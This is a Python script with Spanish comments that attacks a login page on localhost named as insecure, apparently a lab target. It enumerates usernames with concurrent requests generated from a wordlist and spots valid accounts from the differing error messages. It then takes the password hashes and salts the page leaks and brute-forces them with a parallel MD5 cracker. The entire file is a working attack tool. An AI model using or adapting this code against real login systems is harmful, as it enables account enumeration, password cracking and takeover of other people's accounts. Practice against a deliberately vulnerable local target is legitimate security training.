import aiohttp
import asyncio
import itertools
import hashlib
import string
import argparse
import multiprocessing
import sys

URL = "http://localhost:8080/login_inseguro.php"
PASSWORD_FAKE = "abc"
MAX_CONCURRENT_REQUESTS = 30
DICTIONARY_PATH = "userlist_generated.txt"
NUM_PROCESOS = 12

# -------------------- ARGUMENTOS --------------------
parser = argparse.ArgumentParser(description="Fuerza bruta de password con hash + salt")
parser.add_argument("--hash", help="Hash objetivo (MD5)")
parser.add_argument("--salt", help="Salt objetivo")
parser.add_argument("--max-len", type=int, default=6, help="Longitud máxima del password")
args = parser.parse_args()


# -------------------- HASH CRACKER --------------------
def generate_candidates(min_len=4, max_len=8):
    chars = string.ascii_lowercase + string.digits
    for length in range(min_len, max_len + 1):
        for candidate in itertools.product(chars, repeat=length):
            yield ''.join(candidate)


def check_hashes(chunk, target_hash, salt):
    for password in chunk:
        hashed = hashlib.md5((password + salt).encode()).hexdigest()
        if hashed == target_hash:
            print(f"\n💥 ¡Contraseña encontrada!: {password}")
            return password
    return None


def parallel_crack_md5(target_hash, salt, max_len=6):
    print(f"🧠 Iniciando fuerza bruta en paralelo (max_len={max_len}) con {NUM_PROCESOS} procesos...")

    candidates = list(generate_candidates(4, max_len))
    chunk_size = len(candidates) // NUM_PROCESOS
    chunks = [candidates[i:i + chunk_size] for i in range(0, len(candidates), chunk_size)]

    with multiprocessing.Pool(NUM_PROCESOS) as pool:
        args_list = [(chunk, target_hash, salt) for chunk in chunks]
        results = pool.starmap(check_hashes, args_list)

    for result in results:
        if result:
            return result
    print("❌ No se encontró la contraseña.")
    return None


# -------------------- FUNCIONES USUARIO --------------------
def load_base_words(path):
    with open(path, "r", encoding="utf-8") as f:
        return sorted(set(w.strip().lower() for w in f if w.strip()))


def generate_usernames(base_words):
    usernames = set()
    for word in base_words:
        usernames.add(word)
    for a, b in itertools.product(base_words, repeat=2):
        if a != b:
            usernames.add(f"{a}{b}")
    return sorted(usernames)


async def check_username_and_get_hash_salt(session, semaphore, username, found):
    async with semaphore:
        try:
            async with session.post(URL, data={"loginName": username, "password": PASSWORD_FAKE}) as resp:
                text = await resp.text()
                if "Usuario no encontrado" in text:
                    print(f"[-] No existe: {username}")
                elif "Contraseña incorrecta" in text:
                    try:
                        data = await resp.json()
                        passwordHash = data.get("passwordHash")
                        passwordSalt = data.get("passwordSalt")
                        print(f"[✓] Usuario válido: {username} (con hash/salt)")
                        found.append((username, passwordHash, passwordSalt))
                    except Exception:
                        print(f"[✓] Usuario válido: {username} (sin hash/salt)")
                        found.append((username, None, None))
                else:
                    print(f"[?] Respuesta inesperada para {username}: {text}")
        except Exception as e:
            print(f"[!] Error con {username}: {e}")


async def discover_users():
    base_words = load_base_words(DICTIONARY_PATH)
    usernames = generate_usernames(base_words)
    print(f"🔎 Probando {len(usernames)} posibles nombres de usuario...")

    found = []
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

    async with aiohttp.ClientSession() as session:
        tasks = [check_username_and_get_hash_salt(session, semaphore, u, found) for u in usernames]
        await asyncio.gather(*tasks)

    print("\n✅ Usuarios válidos encontrados:")
    for u, h, s in found:
        print(f" - {u}")
    return found


def crack_passwords_for_users(users, max_len):
    for username, passwordHash, passwordSalt in users:
        if passwordHash and passwordSalt:
            print(f"\n🚀 Crackeando {username}...")
            password = parallel_crack_md5(passwordHash, passwordSalt, max_len)
            if password:
                print(f"✅ ¡Contraseña encontrada para {username}!: {password}")
            else:
                print(f"❌ No se encontró contraseña para {username}")
        else:
            print(f"⚠️ No se tiene hash/salt para {username}. Se podría probar otro método aquí.")


# -------------------- MAIN --------------------
if __name__ == "__main__":
    if args.hash and args.salt:
        parallel_crack_md5(args.hash, args.salt, args.max_len)
    else:
        # Modo descubrimiento + cracking si hay hash/salt disponibles
        users = asyncio.run(discover_users())
        crack_passwords_for_users(users, args.max_len)
